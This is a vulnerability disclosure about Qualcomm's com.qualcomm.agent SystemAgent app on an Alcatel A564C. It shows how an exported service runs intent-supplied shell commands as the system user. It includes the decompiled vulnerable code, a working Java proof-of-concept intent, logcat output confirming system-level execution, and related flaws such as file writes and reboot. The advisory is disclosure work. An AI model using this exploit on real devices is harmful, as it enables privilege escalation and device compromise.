# CVEs
- No CVEs requested / None assigned, reported directly to vendor
- Issue 1: Qualcomm SystemAgent application allows unprivledged user execution of shell commands as system user
- Issue 2: QSA applications allows ability for unprivledged user to set system properties.
- Issue 3: QSA applications allows ability for unprivledged user to write strings as system user.
- Issue 4: QSA applications allows ability for unprivledged user take a screen shot of device.
- Issue 5: QSA applications allows ability for unprivledged user reboot the device.

## Authors
- Jon “jcase” Sawyer - jcase@cunninglogic.com

## Affected Devices (tested on)
- Accatel A564C (TCL/ALCATEL_A564C/Yaris5NA:4.4.2/KVT49L/v4FAZ-0-0:user/release-keys)
- Potentially other devices with the com.qualcomm.agent package install on it

## Main (interesting) Vulnerability 

Only diving directly into the interesting vulnerability which is the Qualcomm SystemAgent application allowing an unprivledged user to
 execute any shell commands as system user. This application apparently was never meant to ship on production devices.

### Result
Local privilege escalation to system user, with multiple groups running in the system_app context

### Overview

The Qualcomm SystemAgent application (package name `com.qualcomm.agent`) has an unsecured (exported, no permissions required):

```
<service android:name="com.qualcomm.agent.SystemAgent">
<!-- snip -->
    <intent-filter>
        <action android:name="android.system.fullagent" />
        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
</service>
```

The when a `startService` broadcast is sent to the `SystemAgent` using the fullagent action intent, the service executes the intent's "para"
data field as a shell command.

```
Values.ACTION_FULL_AGENT = "android.system.fullagent";

public int onStartCommand(Intent intent, int flags, int startId) {
// .. snip ..
    else if(Values.ACTION_FULL_AGENT.equals(intent.getAction())) {
        this.exec(intent.getStringExtra("para"));
    }

    return 1;
}

    void exec(String para) {
        new Thread() {
            final SystemAgent this$0;
            final String val$para;

            public void run() {
                int v13 = 0x23;
                try {
                    SystemAgent.logd(this.val$para);
                    String[] paras = this.val$para.split(",");
                    int i;
                    for(i = 0; i < paras.length; ++i) {
                        SystemAgent.logd(i + ":" + paras[i]);
                    }

                    Process mProcess = Runtime.getRuntime().exec(paras);
                    mProcess.waitFor();
                    BufferedReader inBuffer = new BufferedReader(new InputStreamReader(mProcess.getInputStream()));
                    String data;
                    for(data = ""; true; data = data + s + "\n") {
                        String s = inBuffer.readLine();
                        if(s == null) {
                            break;
                        }
                    }

                    SystemAgent.logd(data);
                    int result = mProcess.exitValue();
                    SystemAgent.logd("ExitValue=" + result);
                    String resultProp = paras[0] + ",";
                    if(result >= 0 && result != 0xFF) {
                        resultProp = data.length() > v13 ? resultProp + data.substring(0, 0x23) : resultProp + data;
                    }

                AgentUtils.setSystemProperties(Values.AGENT_RESULT_PROP, resultProp);
                    return;
                }
                catch(Exception e) {
                    SystemAgent.logd(e);
                    return;
                }
            }
        }.start();
    }
```

### Proof of concept

```
ComponentName intentComponent = new ComponentName("com.qualcomm.agent", "com.qualcomm.agent.SystemAgent");
Intent serviceIntent = new Intent ("android.system.fullagent");
serviceIntent.setComponent(intentComponent);
serviceIntent.putExtra("para", "/system/bin/id");
startService(serviceIntent);
```

Result from logcat:
```
  D/SystemAgent( 4109): [onCreate] RUN
  D/SystemAgent( 4109): [onStartCommand] 1
  D/SystemAgent( 4109): [access$000] /system/bin/id
  D/SystemAgent( 4109): [access$000] 0:/system/bin/id
  D/SystemAgent( 4109): [access$000] uid=1000(system) gid=1000(system) groups=1000(system),1004(input),1010(wifi),1015(sdcard_rw),1021(gps),1023(media_rw),1028(sdcard_r),2002(diag),3001(net_bt_admin),3002(net_bt),3003(inet),3004(net_raw),3005(net_admin),3009(qcom_diag),41000(u0_a31000) context=u:r:system_app:s0
  D/SystemAgent( 4109): [access$000] ExitValue=0
```

### Additional related vulnerabilities in SystemAgent application

More issues are found inside the method `private void doSystemActions(String para)`, which 
are located and accessable in the same service. This  allows an unprivledged application/user to:
- Set system properties
- Write strings to files as system user (writeFileAgent)
- Take a screen shot and save it to “/storage/sdcard1/logs/screenshot.png"
- Reboot the device﻿
